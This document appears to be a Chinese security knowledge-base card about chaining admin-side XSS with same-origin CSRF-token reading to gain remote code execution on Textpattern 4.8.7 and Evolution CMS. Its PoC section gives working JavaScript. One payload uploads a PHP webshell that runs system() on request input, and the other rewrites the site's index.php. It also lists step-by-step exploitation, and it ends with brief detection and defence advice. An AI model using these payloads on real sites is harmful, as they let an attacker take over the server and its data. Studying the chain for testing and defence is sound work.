---
id: web-generic-xss-admin-session-csrf-file-upload-edit-rce
title: 后台存储型 XSS 借管理员会话 CSRF 写文件：同源 fetch 读静态 token 上传插件或编辑 index.php 拿 shell（Textpattern / Evolution CMS）
type: scenario
domain: web
path: web/generic/xss
technique: admin-xss-session-csrf-file-write-rce
aliases:
- XSS 打管理员上传 webshell
- 后台 XSS CSRF 文件上传
- Textpattern 4.8.7 XSS
- Evolution CMS XSS 改文件
- 静态 CSRF token 同源读取
- XSS2RCE 后台链
tags:
- web
- xss
- csrf
- stored-xss
- admin-session
- file-upload
- webshell
- rce
- textpattern
- evolution-cms
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V564
  verified_at: '2026-11-12T08:05:49+08:00'
  notes: 已对照原文与4张图片全文核对：Textpattern 4.8.7 文章预览Body未过滤XSS、token静态可访问首页记录、multipart上传theplugin=csrfshell.php(install_new/event=plugin/step=plugin_upload/_txp_token)与Evolution CMS同源GET /manager/?a=1取path后POST mode=save改写index.php两段PoC与卡一致；本卡无直接对应图片（4图为Notable与ZxDesktop相关），技术点均来自正文代码段。dedup仅自匹配duplicate，phpStudy计划任务CSRF、同源静态HTML上传XSS等候选为related不同sink，非同链；全库无Textpattern/Evolution CMS既有卡。未复跑；原文未给版本区间（Textpattern 4.8.7为文中点名版本），未set-versions。
---

## 一句话结论

当后台存在存储型/反射型 XSS（如 Textpattern 4.8.7 的文章预览 Body、Evolution CMS 的后台参数）且管理员会浏览受影响页面时，XSS 脚本以管理员身份在同源执行，可直接 `fetch` 调后台的文件上传/文件编辑接口（携带 Cookie），CSRF token 若是静态或可在同源页面读出，就完全挡不住脚本——写入 PHP 插件或改写 `index.php` 即 getshell，形成 XSS→RCE 的完整链。

## 原理

- **XSS 的执行身份是管理员**：后台存储型 XSS 在管理员浏览器中执行时，脚本与后台同源、自动携带管理员会话 Cookie（`credentials: 'include'`），等价于攻击者获得了"以管理员身份发起任意同源请求"的能力。
- **CSRF token 挡不住同源脚本**：CSRF 防护针对的是跨站请求伪造，攻击者在第三方站点无法读取目标站 token；但 XSS 脚本本身就在目标源内，可以 `GET` 后台页面、解析出 `_txp_token`/`path` 等隐藏字段，再带进后续请求。Textpattern 的插件上传 token 还是静态的，直接访问首页记录即可；Evolution CMS 则从 `/manager/?a=1` 页面读取 `input[name="path"]`。
- **后台功能即 sink**：
  - Textpattern：`POST /textpattern/index.php`，multipart 中 `theplugin=csrfshell.php`、`install_new=Upload`、`event=plugin`、`step=plugin_upload`、`_txp_token=<token>`，即可把带 `system($_REQUEST['cmd'])` 的 PHP 作为插件上传。
  - Evolution CMS：`POST /manager/index.php`，`a=1&mode=save&path=<站点路径>/index.php&content=<?php phpinfo(); ?>`，直接改写站点入口文件。
- **为什么成立**：文件上传与文件编辑是后台的合法功能，服务端只校验"是否登录 + CSRF token 是否匹配"，而这两者在 XSS 场景下都由管理员浏览器自动满足；危险在于把 XSS 的危害从"弹框/窃取 Cookie"扩展到"调用高权限业务功能"。
- **前提**：管理员会被诱导访问 XSS 页面（或 XSS 在管理员常看的列表/预览页持久化）；后台存在上传/编辑类功能且当前管理员有权限；上传目录可解析 PHP 或能改写可执行文件。

## 触发条件

- 目标 CMS 存在可被管理员触发的 XSS（Textpattern 4.8.7 的 Body 预览、Evolution CMS 后台参数等）。
- 攻击者能让管理员会话加载该 XSS（发链接 / 等审核 / 存储型列表页）。
- 后台有文件上传（插件/主题/媒体）或文件编辑功能，且服务端仅以会话 + CSRF token 鉴权。
- token 静态、或可从同源页面读取（脚本可先 fetch 解析）。
- 上传目录可执行脚本，或可改写已可执行的入口文件。

## 利用步骤

1. 在可持久化的字段（文章预览 Body、用户名、站点配置等）注入 XSS，确认管理员浏览时脚本执行（可先弹框验证）。
2. XSS 脚本先 `fetch` 后台页面，提取 CSRF token / 目标路径等隐藏字段。
3. 调上传接口写 webshell（Textpattern 插件上传），或调文件保存接口改写入口文件（Evolution CMS）。
4. 访问 webshell / 触发被改写的页面，执行命令确认 RCE。
5. 清理测试文件与注入内容。

## PoC

Textpattern 4.8.7 插件上传（XSS 直接在管理员浏览器执行）：

```javascript
function uploadWebShell(token) {
  fetch('/textpattern/index.php', {
    method: 'POST',
    headers: {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryozIzNEFsufRB6LpY'},
    credentials: 'include',
    body: '------WebKitFormBoundaryozIzNEFsufRB6LpY\r\nContent-Disposition: form-data; name="theplugin"; filename="csrfshell.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php if(isset($_REQUEST[\'cmd\'])){ echo "<pre>"; system($_REQUEST[\'cmd\']); die; }?>\r\n------WebKitFormBoundaryozIzNEFsufRB6LpY\r\nContent-Disposition: form-data; name="install_new"\r\n\r\nUpload\r\n------WebKitFormBoundaryozIzNEFsufRB6LpY\r\nContent-Disposition: form-data; name="event"\r\n\r\nplugin\r\n------WebKitFormBoundaryozIzNEFsufRB6LpY\r\nContent-Disposition: form-data; name="step"\r\n\r\nplugin_upload\r\n------WebKitFormBoundaryozIzNEFsufRB6LpY\r\nContent-Disposition: form-data; name="_txp_token"\r\n\r\n' + token + '\r\n------WebKitFormBoundaryozIzNEFsufRB6LpY--\r\n'
  });
}
uploadWebShell(token);
```

Evolution CMS 改写入口文件：

```javascript
$.get('/manager/?a=1', function (d) {
  let p = $(d).contents().find('input[name="path"]').val();
  $.ajax({
    url: '/manager/index.php', type: 'POST',
    contentType: 'application/x-www-form-urlencoded',
    data: {a: 1, mode: 'save', path: p + '/index.php', content: '<?php phpinfo(); ?>'}
  });
});
```

## 变体与关联

- 同类链：[[web-generic-xss-phpstudy-panel-login-name-csrf-scheduled-task-rce]]（面板 XSS → 管理员会话建计划任务 RCE）、[[web-generic-xss-csp-self-uploaded-js-same-origin-script]]（同源脚本与 CSP）、[[web-generic-xss-self-xss-csrf-auto-create]]（自 XSS + CSRF 自动建对象）。
- 变体：后台若有"主题/模板编辑""数据库备份下载/恢复""计划任务"等功能，同样可把 XSS 变成写文件或命令执行；token 可从同源页面、Cookie 或接口读取时 CSRF 防护失效。
- 边界：管理员不访问 XSS 页面、`HttpOnly` 与会话绑定导致 Cookie 不能用但同源请求仍可用、上传目录不可执行、token 与会话/动作绑定且一次有效、管理员无对应功能权限时，链路受限。

## 检测与防御

- **检测**：后台页面出现 `<script>`/`onerror`/`onmouseover` 等注入内容；管理员会话在短时间内请求上传/文件保存接口且 Referer 为后台页面；上传目录出现新 PHP 文件或入口文件被改写。
- **防御**：对所有输出做上下文编码，富文本用白名单净化；上传类型/内容/落盘目录强校验，上传目录禁止执行；文件编辑限制在白名单模板路径；CSRF token 与会话+动作绑定并一次性使用；敏感操作二次认证；CSP 限制内联脚本。
